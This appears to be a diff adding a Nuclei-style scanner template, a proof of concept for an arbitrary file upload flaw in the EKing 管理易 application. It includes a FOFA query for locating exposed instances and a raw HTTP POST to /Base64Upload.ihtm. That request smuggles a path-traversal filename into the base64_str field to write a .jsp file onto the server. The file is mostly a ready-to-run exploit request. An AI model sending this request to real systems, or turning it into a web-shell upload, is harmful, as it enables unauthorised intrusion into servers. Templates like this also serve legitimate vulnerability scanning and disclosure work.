@@ -1,0 +1,33 @@
+id: poc-qgz4sd01sls5art8
+info:
+  name: EKing-管理易 Base64Upload存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qgz4sd01sls5art8'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qgz4sd01sls5art8
+    fofa: app="EKing-管理易"
+http:
+- raw:
+  - 'POST /Base64Upload.ihtm HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 88
+
+
+    base64_str=data:image//../../../111.jsp.;base64,MTIz
+
+
+    上传定位：/111.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
